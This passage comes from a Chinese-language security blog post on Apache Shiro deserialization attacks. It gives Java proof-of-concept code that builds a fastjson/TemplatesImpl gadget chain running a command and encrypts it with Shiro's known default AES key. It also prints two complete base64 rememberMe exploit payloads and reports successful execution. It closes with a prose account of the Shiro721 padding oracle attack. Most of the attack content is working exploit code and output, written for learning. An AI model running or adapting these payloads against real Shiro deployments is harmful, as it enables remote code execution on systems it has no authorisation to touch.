class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(encryptKey, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-comment">// 创建IV 随encrypt一起传输</span><br>        <span class="hljs-type">byte</span>[] IV = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(IV);<br>        cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);<br>        <span class="hljs-type">byte</span>[] enEvilbytes = cipher.doFinal(CC321bytes);<br>        <span class="hljs-comment">// 拼接IV和加密后的CC321</span><br>        <span class="hljs-type">byte</span>[] IVandEncrypt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[IV.length + enEvilbytes.length];<br>        System.arraycopy(IV, <span class="hljs-number">0</span>, IVandEncrypt, <span class="hljs-number">0</span>, IV.length);<br>        System.arraycopy(enEvilbytes, <span class="hljs-number">0</span>, IVandEncrypt, IV.length, enEvilbytes.length);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">IVandEncryptB64</span> <span class="hljs-operator">=</span> Base64.encodeToString(IVandEncrypt);<br>        System.out.println(IVandEncryptB64);<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 模拟 shiro 的解密过程，反序列化验证</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-comment">// base64解码</span><br>        <span class="hljs-type">byte</span>[] IVandEncryptBytes = Base64.decode(IVandEncryptB64);<br>        <span class="hljs-comment">// 拆分IV和加密后的CC321</span><br>        <span class="hljs-type">byte</span>[] deIv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">byte</span>[] evil = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[IVandEncryptBytes.length - deIv.length];<br>        System.arraycopy(IVandEncryptBytes,<span class="hljs-number">0</span>,deIv,<span class="hljs-number">0</span>,deIv.length);<br>        System.arraycopy(IVandEncryptBytes,deIv.length,evil,<span class="hljs-number">0</span>,evil.length);<br>        cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);<br>        <span class="hljs-type">byte</span>[] deEvilBytes = cipher.doFinal(evil);<br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(deEvilBytes);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais).readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">AAAAAAAAAAAAAAAAAAAAAItICRDL55PQ4M+uF<span class="hljs-regexp">/0QjIxmsxx8mwO0zL+cCUsm9HObVST6ifzXbe1pfVhnBOcNB/</span>avKvCNhZKKEkw8li0SSbf62ZGen2JxK9GPNTlXi10BCSiCCjUZj2I2OccLu<span class="hljs-regexp">/h/i</span>BFMCuLAaK+Qzr6jV6+n8rm8vAp3o7q2HqBXHvAtciY4ur4CJ356Mme5jrqdtaI++cjAuJgvjG3cRsWrMSooPDeAci0crfFK+<span class="hljs-number">3</span>Lj3yVUF1Hic+S2UG4nlsv9ixbN2kQ9h2LlMtIcVm6WT6Nr5OSOvVsAwszSf0fjPoz+ZV340lZebku3UTz4947xrVK7P<span class="hljs-regexp">/nbwwFa8XIEJ0yKIQB/</span>sYws6sw2JV4vIWCAwfc+vN2V4z56fT2UVi4k64VXxqNa94C0lKJohsH+ekApS3UO4zu1m8uSAzawBSsA+KaS<span class="hljs-regexp">/Uz/</span>jdkLce6gQnaqHJ7p78wDvsFWeUi6hQMjy5fg1P+<span class="hljs-number">5</span>eBhmovLnC7D0WFj0uoMsbB95FrefRlbHyyTeJs7wDQrRDc8iJOZWC91l+YYNJFTOn2HWJ+<span class="hljs-number">29</span>+LLNKvNClPTis+MXhnnjH+Hj0xyNrXB7S2PB1E0fGDJhiQs98Pqipea5hpDqBBnWrzyezLH+u82k9ZGPnonP4DgEhsEHSDaO2Vw7wTg1+<span class="hljs-number">97</span>NhTC<span class="hljs-regexp">/h9GNGi3bQE21S/</span><span class="hljs-number">3</span>AYJLao0MUtpa52zr837v4HjSmW9f3mJQuQ9GmHmhE8aIlP1zeIn9dGFhJ+LlO+LqTkJMy2MtW9<span class="hljs-regexp">/yGzQmFfmrUwY9FZqk9eC/</span>+<span class="hljs-regexp">/PdkRGyaMn5tqQH1KpcmNkFkuxz9M0RUx63jYL2ffaCj6i5KpESR6xEoc0vvsu4AEgrDbyIJi0budSvG86IBh4sty+X5xuJ3EGplU+yJMi3wz+UrRxCqjX6nflO6xDGJ9dJd0fpBB2ot5HKxnGtRorkqhPFfHrxCxWvsDUvv2ZBNS+g2zcBphPB2/m</span>dG8RcKqAHymGZPDe0+LbLj0a3B8+wXxZtirvPrkeMES7pHjLneZ718cBtfGvx0Chpp02qdTSMcWNB+<span class="hljs-number">7</span>E3Wzr+Vpx2KaRA22RXKACSQhVydwenhCv5nJj2qnMtSYV8sgzWOupyDHW9<span class="hljs-regexp">/Gcec4SFTXgR4hAFH0hFGcuuwOK/</span>lDlO1utPsjqKNxaAmjPWNtunGoRIOTJdu9fmhOuy0fCr3xAdblSCm<span class="hljs-regexp">/mCNdd7QyG7v+d3OOVkct7r937jcIqHe0DiS3BlwCyqP525b1+o9q/</span>sLCbUj+A5b3<span class="hljs-regexp">/Ubss2jFxkFnTL2V07Hmegl11UKTPjYHXzv5zW5K04f/g</span>VQZD+ZY3BtSWxZ6Dg+<span class="hljs-regexp">/6I5clWQDF7b4hBZHCAUDn09bqxXZrdWnYdmyX2IVDMa2bI9oSulYDAMrBSyj7aXUcjVeto/</span>Sc+<span class="hljs-number">52</span>Dl0uBZuGA7b6unOSMP4vAJfvqFSxZhUGjw3OmmnAGFAMZHo5qsABRaog9YECiLewNF7s<span class="hljs-regexp">/aIQQzX3x0enlevOuTH5DqciIohptR2l8T6l6StH7bk5Gr7tIpeEcz4RGlQwcisgNp1RaPuDyMhcmzHq2teP725deD/</span><span class="hljs-number">9</span>bj6ODbTidpB3YnbxBfSs6weHTVt6WpEw6id9IHJyNRYV70NbBYVeukqgSsK8Rg1lc3AHCByTyNCka8kbtZb40zPWKxq+gmSqXwjHvLxLOPEXEBKKfO<span class="hljs-regexp">/KzX0Cf0NEko/</span>GPcBVGxOhLWc0TZuU<span class="hljs-regexp">/taFQIIfS9mP3bB+mqVPdkiRfJaGDpb4udWK4Hds9sxXEiUlKcyvHMg4NWATkCfFBQcyIAK5i0rE+Z0LOTt1Q0H15vcPtW5j9yA/</span>kPUYwfP8olw13dnBOkcqLmvpaBgp7t8UAgb5EhSNPoVqLiFdldzF6ALKwVlUDGiMycnrTOc9LQuKKBnZcn5T0PiL59GcBJIXKF1jQLPXeN+pTwyIO1CPTicPPVjZSqNWKpW2bocHCqgUaeA2Q<span class="hljs-regexp">/4ldwPzatCSEvQAmD4sLfAmLbc/</span><span class="hljs-number">57</span>NXJXznItUAi4mJ4WCKaTU+pv6wQeuj+K2w0HYA9<span class="hljs-regexp">/3je8tvysLI83U84CGgWv3hncZqgSlxw0xAOa4zh1aq43vWPXAO685mFSSkBFa4Ci2pVlk7TFV12dGyhna80NZMErbzSVJ9qukaDB8dJYISDn8n8WJyCwj64mkeyz1gKdkja25epgQf1tJFdYMMwzVDhp68zEjmogFCR5PAzpPq6/</span>zNVArPQlOiFxS4ew0LFQSzabk9kn5RdkIgvv7a0vbjjMYwuu0oOdFLkqH9+s<span class="hljs-regexp">/2s4LKEyb9fpOwZ87Df5UPEmQgKTf670a95TzZilB3WXS/y</span>M4UFZN+gLPF2l56sVQPLdHQPGiFge3NTHKOfW0njMtCh<span class="hljs-regexp">/Qmvi2OqAFeHld4d+27+E1fJtlI8RsdblHfqPCRO7txvhlpNRTjXocE374NF/</span>sYOjUYBoZn1jEZSoJlD74rJW8IYXegRK7ZqL1QnI7PDXLyhesBQOCFKbTVM2O63txORQJEgBl1Zb0entx6BQhmBoxy1JMZwZODXPoAVTNkjkcyHRmlLWWqhZk4oBCCMlm2+FYaXxoJ81Qb7n2UjxvC0lAEOmfz<span class="hljs-regexp">/G+Vhz3gA+0m1s9EHzlRdOGPRfTMsTlltNjQywIX4gQnmsV0P7bq07jVG0SO7aBl/</span><span class="hljs-number">9</span>AhqSmWTMy13VU8qJpDHwCx4tP<span class="hljs-regexp">/+CgLQ0Nn/</span><span class="hljs-number">6</span>W6H84fT2GuGwoSH8=<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250421164652463.png" srcset="/img/loading.gif" lazyload alt="image-20250421164652463"></p>
+<h4 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h4><p>对于高版本可以选择用 JNDI 绕过的一些手法，我之前在 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/LINGX5/p/18780870">这篇文章</a> 也讨论这个话题，这里就不过多赘述了</p>
+<h3 id="Fastjson-链攻击"><a href="#Fastjson-链攻击" class="headerlink" title="Fastjson 链攻击"></a>Fastjson 链攻击</h3><p>我们在之前讲 fastjosn 的时候，审过这样一条链，具体可以看我之前这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LINGX5/p/18809006">fastjson 原生反序列化链</a></p>
+<p>当目标有 fastjosn 在版本 1.2.48-2.0.26 之间时</p>
+<p>我们写 payload, 导入依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba.fastjson2<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvil() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        ctClass.setSuperclass(classPool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime&quot;</span> +<br>                                            <span class="hljs-string">&quot;.AbstractTranslet&quot;</span>));<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br>        <span class="hljs-keyword">return</span> ctClass.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object object, String fieldName, Object fieldValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(object, fieldValue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPOC</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setField(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getEvil()&#125;);<br>        setField(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">array</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        array.add(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;lingx5&quot;</span>);<br>        setField(badAttr,<span class="hljs-string">&quot;val&quot;</span>,array);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(templates, badAttr);<br>        <span class="hljs-keyword">return</span> hashMap;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化map gadget</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(getPOC());<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] evilBytes = barr.toByteArray();<br>        <span class="hljs-comment">// AES加密</span><br>        <span class="hljs-type">byte</span>[] key = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-comment">// 创建 IV</span><br>        <span class="hljs-type">byte</span>[] iv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivParameterSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(iv);<br>        <span class="hljs-comment">// 创建密钥</span><br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">secretKey</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(key, <span class="hljs-string">&quot;AES&quot;</span>);<br>        cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivParameterSpec);<br>        <span class="hljs-type">byte</span>[] enBytes = cipher.doFinal(evilBytes);<br>        <span class="hljs-comment">// 拼接 IV 和 加密后的内容</span><br>        <span class="hljs-type">byte</span>[] IVAndEnBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[iv.length + enBytes.length];<br>        System.arraycopy(iv, <span class="hljs-number">0</span>, IVAndEnBytes, <span class="hljs-number">0</span>, iv.length);<br>        System.arraycopy(enBytes, <span class="hljs-number">0</span>, IVAndEnBytes, iv.length, enBytes.length);<br>        <span class="hljs-comment">// 输出 Base64 编码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">evilBase64</span> <span class="hljs-operator">=</span> Base64.encodeToString(IVAndEnBytes);<br>        System.out.println(evilBase64);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * AES解密，模拟shiro反序列化</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// 解码 Base64 编码</span><br>        <span class="hljs-type">byte</span>[] decodeBytes = Base64.decode(evilBase64);<br>        <span class="hljs-comment">// 提取 IV</span><br>        <span class="hljs-type">byte</span>[] deIv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        System.arraycopy(decodeBytes, <span class="hljs-number">0</span>, deIv, <span class="hljs-number">0</span>, deIv.length);<br>        <span class="hljs-type">byte</span>[] encBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[decodeBytes.length - deIv.length];<br>        System.arraycopy(decodeBytes, deIv.length, encBytes, <span class="hljs-number">0</span>, encBytes.length);<br>        <span class="hljs-comment">// 解密</span><br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">deIvParameterSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(deIv);<br>        cipher.init(Cipher.DECRYPT_MODE, secretKey, deIvParameterSpec);<br>        <span class="hljs-type">byte</span>[] evil = cipher.doFinal(encBytes);<br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(evil);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">AAAAAAAAAAAAAAAAAAAAAItICRDL55PQ4M+uF<span class="hljs-regexp">/0QjIxmsxx8mwO0zL+cCUsm9HObVST6ifzXbe1pfVhnBOcNB/</span>avKvCNhZKKEkw8li0SSbf62ZGen2JxK9GPNTlXi10Bp6j65VyUWtxVyYE4il61Wz72<span class="hljs-regexp">/9j9pR2bI9zt1UT3fuJS0J65VDDenY1jZtg/</span>atIMZ+p+RSLOdE3fleOrFMCJxzZJvUH4WqiyimKNvfiTILCnIRbDNjNOhLBVav0QnLcqWWEoJyThGmSrlfDrJOP1rJLyFNhcOmpjnKqhPhTDl2LtenLCardHSUnk1Mp53h6QWoe3OyukgWX7R6<span class="hljs-regexp">/ygPx1zAYusF/</span>PoAAt83QeC1re67H+fZd66t4PkN0d6159+mdLqcZGiiekCmisWpMyiomkHEIPUx8fzEd2avnJe6qy12R7Gi7D4W4b<span class="hljs-regexp">/zl7G1IQyaNka4GrWnlA2XMDaUZlBsrRtzT8htTBZZhtJKDQyFLwk4anK/</span>LBRQ1071fozqukGjgBNHlmj+<span class="hljs-number">4</span>NgCRRSijb<span class="hljs-regexp">/+BJrL0YokSjkiUfdlohqFD8kkYR/</span>U9VZrIGbdoyn158uTlnAEBaz0thjlZPtRr2BPG5tvyqBITrdbN2LOPn0ppG<span class="hljs-regexp">/5kGIdNpHq8TkyfNYZzyB5KwMZOu5tLycy1kR8E3JPzJFiU4pMaWOMEbttNwJ2SR+d/</span>jRvtECEoiIC5KwdzGSWkJU1PSYxO39s+CQnfpk8Oy9innnSdKiOodXQAzF1I5If<span class="hljs-regexp">/rzi6+eqp7+e0URdyoVAMK77iy1H50xKMcxCYWVnbZ9ZQL6leAI7+d/</span>PPyjZ<span class="hljs-regexp">/Wm3YDwJYAdlis88WSfbQxNIf6CsU3b03i00EwQVXaXjoYQiHRDLSR6HMKTSaV3BPshDn8HgECp+R7h81vjyhBaSiARp+/</span>D8fPSBPsSgdGJ3q1dw+NQmlXnYnEb1+nkF4nO6aIYJJ2ae9uTa9A7jJ4cR7mcCr0jncHtlRr8gdhrqrk5dCCdUDE7Hhxz30P19qcIBKNWNaVHL97<span class="hljs-regexp">/Kv+w3D5AzY0aNuAg5W47BCWAIK6Uo7RvmVKOEJ4BY/</span>eCzb1MZgEzLv33CcGMwrAj+O4jW0pWLSfaSykY3UTbKL01OnBrru7c233SIrcef47RpJYmT66hk5N8ocMufLu0AaL9LcMu2p3EtzWUjPHY4P<span class="hljs-regexp">/P4OqQ45hsBkEPWhs1hgWvKoP24INrh1+vRV6gBiJ7yc37GR8ss8+Hegj6ccSjdzSg3Wg/</span>n987w<span class="hljs-regexp">/NUlpL8UYfJ08vbMwc7k0X8tqvivg2zEbVRT50evpy+LMgCqmMcZE02WAvNovoWuLZSkSQ/</span>B6It4uYDvdhRa7efrTYJItzSnaBwd7eNV70Md17pF5slCvmMfPoHWE0aQBYJFgbvLIFMxjyeUpwjQbL6hzqR8<span class="hljs-regexp">/8lXaFP6u9vA89YKLZstFcG6miv+GE2/</span>qAx2ZgSKCZ2+MZH6IhGg+<span class="hljs-number">98</span>sby<span class="hljs-regexp">/kGETEDbXGEk9M3n4QdgGaE6IeVg6BHHK4/</span>BfT3Y6xY2sreazN478mUhyv1qJw9ybpUwrzdbZeSci4+CD9U19Qpxdylh3W7BTYeVhI0mR9K09CH94zXzyKpv4VuxDLBGomFLGX5hlDvq23M6<span class="hljs-regexp">/nXF/</span>U4LRFCBS+<span class="hljs-number">2</span>pfkmj<span class="hljs-regexp">/MXMyiJ8fCkKov96OTpZybriibSY3ydKF6Zve+clPk+eRGp4r0gz8usz0tkfKxSGzoA7vjJtowEijVfKybjQqDckc1dv5DTlXpRiWlhomlywu33WYi57LGIvyfk197zXRgqDCfZzOB5m1VHnGn4n36qjW4g2EeJThZQx6pThIgzzom1nVjn8cDuPjTpC7B6pOezgISzlMT3XykuBBdOG++w7mKn2dZdYNKhYKaMJ7YYdXcEmUUJPc0u02usvLVgK/</span>IgNzLmRYJWuONEqlluqu6RYyxLp3BCmaYXDHhQxXPodalFnrXyvw3tLSahX74v4FdszCkYbPCIfsmweAjyO<span class="hljs-regexp">/+C2z7Iu4w5OaXkrAlko2kWWOIcKSO+Tf5w/</span>hIORRVPyE3J5tj0WmSc4VKGRI2JFJD0yoWvevMLq1VV6YZZibFAbZl7LE0FHyxMw2XINEswdeyIdH8WgAhZj8ynfO78h6z9aPAS15DGgxfRgnDQXRsDghV/D+<span class="hljs-number">6</span>CbXNewTtNvnpym8d7wIxlNqcOWh7eebI7qxDBu8cBFXJ63p1hMiNg69sTAMcnELDHI5fglaDwjaUKPeSZ3dw==<br></code></pre></td></tr></table></figure>
+
+<p>看到是可以执行成功的</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420201255464.png" srcset="/img/loading.gif" lazyload alt="image-20250420201255464"></p>
+<h2 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h2><p>影响版本：shiro &lt; 1.4.2  (1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1)</p>
+<p>在 shiro550 中，官方使用的加密 key 是硬编码在源代码中的，这给了攻击者利用解密的过程可以传入带有攻击的 RememberMe 载荷。</p>
+<p>在 shiro721 中，官方是在 shiro 的内部动态生成一个用于加密的 key，不过默认使用的 AES-128-CBC 模式加密，这种加密模式可以使用 Padding Oracle Attack 攻击技术，爆破中间值，从而可以构造精心设置的 payload</p>
+<p>关于加密模式是如何破解的，可以看这位师傅的文章：<a target="_blank" rel="noopener" href="https://goodapple.top/archives/217">CBC 字节翻转攻击&amp;Padding Oracle Attack 原理解析 - 枫 のBlog</a> 讲的很详细了</p>
+<p>简单描述一下：</p>
+<p>加密过程：</p>
+<ol>
+<li>对明文数据进行分组和填充，按照 BlockSize 8 字节，分成若干组，最后一组不足 8 字节，缺 <code>?</code> 位，用 <code>0x?</code> 填充。例如（abcd0x40x40x40x4 或者 abcde0x30x30x3）</li>
+<li>用 <code>IV </code> 和 <code>第一组明文</code> 异或得到 <code>中间值(1)</code> , 然后中间值做 AES 加密，得到 <code>第一组密文</code></li>
+<li>利用 上一次获得的 <code>第一组密文</code> ，作为下一组的 <code>IV</code> 和 <code>第二组明文</code> 进行异或得到 <code>中间值(2)</code> 进行 AES 加密，得到第二组密文</li>
+<li>递归上述操作，得到完整的密文</li>
+<li>把 <code>IV</code> 拼接到密文的最前方 进行传递</li>
+</ol>
+<p>解密过程其实就是反过了</p>
+<ol>
+<li>把拿到的密文分组 8 字节一组，除第一组 <code>IV</code> 外，分别做 AES 解密，获得 <code>中间值(1)</code>, <code>中间值(2)</code>, <code>中间值(3)</code> …..</li>
+<li><code>IV</code> 和 <code>中间值(1)</code> 异或拿到第一组明文</li>
+<li><code>第一组密文</code> 和 <code>中间值(2)</code> 异或拿到第二组明文</li>
+</ol>
+<p><code>IV</code> 和 整体的密文的 base64 编码就是 RemeberMe 字段，也就是说在 shiro 中 <code>IV</code> 和 <code>密文</code> 是可控的</p>
+<p>我们可以控制 <code>IV</code> 的八个字节，先让整体为 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00，去异或根据抛出的异常在尝试 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x01 ~~~ 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0xFF 一定会有一次让明文为 <code>adcdefg0x01</code> 的形式，这个填充是正确的，相当于是分组的时候，长度不够 8 个字节，填充了一位 0x01</p>
+<p>假设 尝试的 <code>IV</code> 为 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x3F</p>
+<p>那么我们可以用 0x3F 异或 0x01 的到 <code>中间值</code> 最后一位 为 0x3E</p>
+<p>知道中间值了 我只需要让 <code>IV</code> 为 <code>？</code> 令 <code>a 异或 0x3E = ？</code> 。这样 我们就可以控制的到的明文最后一位是 <code>a</code></p>
+<p>也就是经过多次爆破后，我们可以把 整组的中间值给爆破出来，利用异或去构造特定的 payload</p>
+<p>Padding Oracle Attack 的基本原理就是这样，简单文字描述了一下，文章讲的很清楚，我就不抄录了。</p>
